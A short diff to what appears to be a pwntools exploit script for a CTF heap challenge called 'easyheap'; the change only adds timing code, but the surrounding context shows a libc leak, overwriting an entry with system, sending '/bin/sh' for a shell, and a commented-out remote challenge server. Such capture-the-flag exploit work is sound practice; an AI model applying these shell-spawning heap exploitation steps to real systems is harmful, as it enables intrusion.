@@ -1,7 +1,10 @@
 from pwn import *
-
+from time import time
+st = time()
 p = process("./tee sample.txt| LD_PRELOAD=./mmap_dump.so ./easyheap", shell=True)
 #p = remote("121.36.209.145", 9997)
+#from time import time
+#st = time()
 #p = process("./easyheap")
 context.terminal = ["tmux","split","-h"]
 libc = ELF("./easyheap.so")
@@ -59,5 +62,6 @@ print(hex(libc.address))
 edit(3, p64(libc.symbols["system"]))
 
 p.sendline("/bin/sh")
-
+et = time()
+print(et-st)
 p.interactive()
